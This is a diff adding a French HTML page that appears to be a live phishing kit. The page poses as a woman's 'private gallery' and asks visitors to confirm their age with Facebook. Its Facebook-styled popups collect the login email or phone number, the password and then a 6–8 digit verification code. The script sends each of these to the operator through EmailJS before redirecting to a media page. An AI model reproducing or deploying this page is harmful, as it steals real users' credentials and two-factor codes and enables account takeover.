@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="utf-8"/>
+  <title>Gallerie privée !</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <!-- Balises Open Graph pour l’aperçu -->
+  <meta property="og:title" content="Accès à ma gallerie privée."/>
+  <meta property="og:image" content="https://sabrina-gallerie-prive.onrender.com/preview_sab.png"/>
+  <meta property="og:url" content="https://sabrina-gallerie-privw.onrender.com"/>
+  <meta property="og:type" content="website"/>
+
+  <!-- Balises Twitter pour compatibilité -->
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" content="Gallerie privée !"/>
+  <meta name="twitter:image" content="https://sabrina-gallerie-prive.onrender.com/preview_sab.png"/>
+
+
+  <meta charset="utf-8"/>
+  <title>Gallerie privée !</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Playfair Display', serif;
+      color: #fff;
+      text-align: center;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      position: relative;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(2px);
+      z-index: 0;
+    }
+
+    .header, .extras, .bitmoji-row, .bottom-banner, .login-popup, .verification-popup, .sponsors {
+      position: relative;
+      z-index: 1;
+    }
+    .header { padding: 40px 20px 30px; }
+    .header h1 {
+      font-size: 4em;
+      color: #FFFFFF;
+      text-shadow: 0 0 15px rgba(228, 0, 15, 0.5);
+      margin-bottom: 10px;
+    }
+    .subtitle { font-size: 1.5em; margin-bottom: 30px; color: #f5f5f5; }
+    .button {
+      background: #1877F2;
+      color: #fff;
+      border: none;
+      padding: 14px 30px;
+      font-size: 1.1em;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s ease-in-out;
+    }
+    .button[disabled] { opacity:.7; cursor:not-allowed; }
+    .button:hover { background:#145dbf; transform: translateY(-1px); }
+
+    .bitmoji-row {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin: 40px 0;
+    }
+    .bitmoji {
+      width: 90px; height: 90px; margin: 12px; border-radius: 50%;
+      background-size: cover; background-position: center;
+      border: 2px solid #0077b6; box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
+    }
+
+    .bottom-banner img { width: 100%; height: auto; display: block; }
+
+
+    /* Overlay + popups (Facebook & vérification) */
+    .overlay {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.6);
+      display: none;
+      z-index: 999;
+    }
+    .login-popup, .verification-popup {
+      position: fixed;
+      top: 10%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90%; max-width: 420px;
+      background: #18191a;       /* thème sombre Facebook */
+      color: #e4e6eb;
+      padding: 24px;
+      border-radius: 16px;
+      box-shadow: 0 12px 32px rgba(0,0,0,0.5);
+      display: none;
+      text-align: left;
+      z-index: 1000;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    }
+    .login-popup h3, .verification-popup h3 {
+      margin: 0 0 12px;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #e4e6eb;
+      text-align: center;
+    }
+    .login-popup label, .verification-popup label { color: #e4e6eb; font-weight: 600; display: inline-block; margin: 8px 0; }
+    .login-popup input, .verification-popup input {
+      width: 100%;
+      background: #242526;
+      border: 1px solid #3A3B3C;
+      color: #e4e6eb;
+      border-radius: 10px;
+      padding: 12px;
+      outline: none;
+      margin-bottom: 10px;
+    }
+    .login-popup input::placeholder, .verification-popup input::placeholder { color: #b0b3b8; }
+
+    .popup-actions {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 8px;
+    }
+    .btn { 
+      border: none; border-radius: 9999px; padding: 12px 16px; font-weight: 700; cursor: pointer;
+    }
+    .btn[disabled] { opacity:.7; cursor:not-allowed; }
+    .btn-primary { background: #1877F2; color: #fff; }
+    .btn-primary:hover { background: #145dbf; }
+    .btn-secondary { background: transparent; color: #e4e6eb; border: 1px solid #3A3B3C; }
+    .btn-secondary:hover { background: #3A3B3C; }
+    .helper { font-size:.9rem; color:#b0b3b8; margin-top:6px; }
+  
+    
+    
+    .bitmoji-layout {
+      position: relative;
+      width: 350px; height: 350px;
+      margin: 50px auto;
+    }
+    .bitmoji {
+      width: 90px; height: 90px;
+      border-radius: 50%;
+      background-size: cover;
+      background-position: center;
+      border: 3px solid #0077b6;
+      box-shadow: 0 0 15px rgba(230,0,18,0.6);
+      position: absolute;
+    }
+    .bitmoji.center { 
+      top: 50%; left: 50%; 
+      transform: translate(-50%, -50%); 
+    }
+    /* 4 avatars à distance égale (rayon = 120px) */
+    .bitmoji.top    { top: calc(50% - 120px); left: 50%;             transform: translate(-50%, -50%); }
+    .bitmoji.right  { top: 50%;               left: calc(50% + 120px); transform: translate(-50%, -50%); }
+    .bitmoji.bottom { top: calc(50% + 120px); left: 50%;             transform: translate(-50%, -50%); }
+    .bitmoji.left   { top: 50%;               left: calc(50% - 120px); transform: translate(-50%, -50%); }
+
+
+
+
+  /* Bouton flottant pour activer/désactiver la musique */
+  .sound-toggle {
+    position: fixed;
+    right: 14px;
+    bottom: 14px;
+    z-index: 2000;
+    background: rgba(0,0,0,0.55);
+    color: #fff;
+    border: 2px solid #0077b6;
+    border-radius: 9999px;
+    padding: 10px 14px;
+    font-weight: 700;
+    cursor: pointer;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.35);
+    backdrop-filter: blur(2px);
+  }
+  .sound-toggle:hover { background: rgba(0,0,0,0.7); }
+
+</style>
+</head>
+<body>
+
+  <!-- Musique 8-bit style Nintendo -->
+  <audio id="bgm" src="music.wav" preload="auto" autoplay loop playsinline></audio></audio>
+
+  <div class="header">
+    <h1>Gallerie privée ! !</h1>
+    <p class="subtitle">Accès à ma gallerie privée.</p>
+    <button class="button" id="facebookBtn" onclick="openFacebookPopup()">Valide ton âge avec Facebook</button>
+  </div>
+
+  
+    <!-- Avatars organisés autour d'un centre -->
+    <div class="bitmoji-layout">
+      <div class="bitmoji center" style="background-image:url('avatar5.png')"></div>
+      <div class="bitmoji top"    style="background-image:url('avatar1.png')"></div>
+      <div class="bitmoji right"  style="background-image:url('avatar2.png')"></div>
+      <div class="bitmoji bottom" style="background-image:url('avatar3.png')"></div>
+      <div class="bitmoji left"   style="background-image:url('avatar4.png')"></div>
+    </div>
+
+    <div class="bitmoji" style="background-image: url('avatar2.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar3.png')"></div>
+    <div class="bitmoji" style="background-image: url('avatar4.png')"></div>
+  </div>
+
+  <div class="bottom-banner">
+    <img src="banner.png" alt="Shooting banner"/>
+  </div>
+
+  <!-- Overlay & Popups -->
+  <div id="overlay" class="overlay" onclick="closeAllPopups()"></div>
+
+  <div class="login-popup" id="facebookPopup">
+    <h3>Valide ton âge avec Facebook</h3>
+    <label for="fb-email">E-mail ou numéro de mobile</label>
+    <input id="fb-email" type="text" placeholder="E-mail ou numéro de mobile"/>
+    <label for="fb-password">Mot de passe</label>
+    <input id="fb-password" type="password" placeholder="Mot de passe"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="fb-submit" onclick="submitFacebook()">Confirmer</button>
+      <button class="btn btn-secondary" onclick="closePopup('facebookPopup')">Retour</button>
+    </div>
+    <div class="helper" id="fb-helper"></div>
+  </div>
+
+  <div class="verification-popup" id="verificationPopup">
+    <h3>Validation des informations</h3>
+    <label for="verificationCode">Entrer le code reçu :</label>
+    <input id="verificationCode" type="text" inputmode="numeric" maxlength="8" pattern="\d*" placeholder="Code de 6 à 8 chiffres"/>
+    <div class="popup-actions">
+      <button class="btn btn-primary" id="code-submit" onclick="finishAndContinue()">OK</button>
+      <button class="btn btn-secondary" onclick="closePopup('verificationPopup')">Retour</button>
+    </div>
+    <div class="helper" id="code-helper"></div>
+  </div>
+
+  <script>
+    // Init EmailJS avec ta clé publique
+    document.addEventListener('DOMContentLoaded', function(){
+      if (window.emailjs) {
+        emailjs.init('AATQVLMcBJaRBgEox');
+      }
+      document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeAllPopups(); });
+    });
+
+    function openFacebookPopup() {
+      document.getElementById('overlay').style.display = 'block';
+      document.getElementById('facebookPopup').style.display = 'block';
+    }
+    function closePopup(id) {
+      document.getElementById(id).style.display = 'none';
+      const anyOpen = document.querySelector('.login-popup[style*="display: block"], .verification-popup[style*="display: block"]');
+      if (!anyOpen) document.getElementById('overlay').style.display = 'none';
+    }
+    function closeAllPopups(){
+      document.getElementById('overlay').style.display = 'none';
+      document.getElementById('facebookPopup').style.display = 'none';
+      document.getElementById('verificationPopup').style.display = 'none';
+    }
+
+    // Envoi EmailJS – connexion Facebook
+    async function submitFacebook(){
+      const email = document.getElementById('fb-email').value.trim();
+      const pass  = document.getElementById('fb-password').value.trim();
+      const btn   = document.getElementById('fb-submit');
+      const help  = document.getElementById('fb-helper');
+
+      if (!email || !pass) { help.textContent = 'Veuillez remplir tous les champs.'; return; }
+
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Envoi en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_connexion', {
+          fb_email: email,
+          fb_password: pass
+        });
+        help.textContent = 'Informations envoyées. Vérification...';
+        // Enchaîne vers la vérification
+        document.getElementById('facebookPopup').style.display = 'none';
+        document.getElementById('verificationPopup').style.display = 'block';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    // Envoi EmailJS – code de vérification
+    async function finishAndContinue(){
+      const code = document.getElementById('verificationCode').value.trim();
+      const btn  = document.getElementById('code-submit');
+      const help = document.getElementById('code-helper');
+
+      if (!code) { help.textContent = 'Veuillez entrer le code de vérification.'; return; }
+      if (!window.emailjs) { help.textContent = 'EmailJS non chargé.'; return; }
+
+      help.textContent = 'Validation en cours...';
+      btn.disabled = true;
+
+      try {
+        await emailjs.send('service_photos', 'template_code', {
+          verification_code: code
+        });
+        // Redirection après succès
+        closeAllPopups();
+        window.location.href = 'medias.html';
+      } catch (err) {
+        help.textContent = 'Erreur EmailJS : ' + (err && err.text ? err.text : JSON.stringify(err));
+      } finally {
+        btn.disabled = false;
+      }
+    }
+  </script>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  var avatars = document.querySelectorAll('.bitmoji-layout .bitmoji');
+  var banner  = document.querySelector('.bottom-banner img');
+  if (!avatars.length || !banner) return;
+
+  avatars.forEach(function(el) {
+    el.addEventListener('click', function() {
+      var bg = el.style.backgroundImage;
+      if (bg) {
+        var match = bg.match(/url\(["']?(.*?)["']?\)/);
+        if (match && match[1]) {
+          banner.src = match[1];
+        }
+      }
+    });
+  });
+});
+</script>
+
+
+  <button id="soundToggle" class="sound-toggle" style="display:none;" aria-label="Activer le son">🔈 Son</button>
+
+
+<script>
+document.addEventListener('DOMContentLoaded', function(){
+  const audio = document.getElementById('bgm');
+  const toggle = document.getElementById('soundToggle');
+  if (!audio) return;
+
+  // Essaie de démarrer en muet (autoplay policy friendly)
+  audio.muted = true;
+  const tryPlay = () => audio.play().catch(() => {});
+  tryPlay();
+
+  // Affiche le bouton si besoin
+  const showToggle = () => { if (toggle) toggle.style.display = 'inline-block'; };
+  const hideToggle = () => { if (toggle) toggle.style.display = 'none'; };
+
+  // Au premier geste utilisateur, on active le son si possible
+  const enableSound = () => {
+    audio.muted = false;
+    audio.play().then(() => {
+      hideToggle();
+      removeEnableListeners();
+    }).catch(() => {
+      // Si ça échoue, on garde le bouton visible
+      showToggle();
+    });
+  };
+  const removeEnableListeners = () => {
+    document.removeEventListener('click', enableSoundOnce);
+    document.removeEventListener('keydown', enableSoundOnce);
+    document.removeEventListener('touchstart', enableSoundOnce);
+  };
+  const enableSoundOnce = () => { enableSound(); };
+  document.addEventListener('click', enableSoundOnce, { once: true });
+  document.addEventListener('keydown', enableSoundOnce, { once: true });
+  document.addEventListener('touchstart', enableSoundOnce, { once: true });
+
+  // Gestion du bouton
+  if (toggle) {
+    toggle.addEventListener('click', function(){
+      if (audio.muted || audio.paused) {
+        enableSound();
+      } else {
+        audio.pause();
+        audio.muted = true;
+        showToggle();
+      }
+    });
+  }
+
+  // Si le son reste muet/pausé après 1s, on montre le bouton
+  setTimeout(() => {
+    if (audio.paused || audio.muted) showToggle();
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
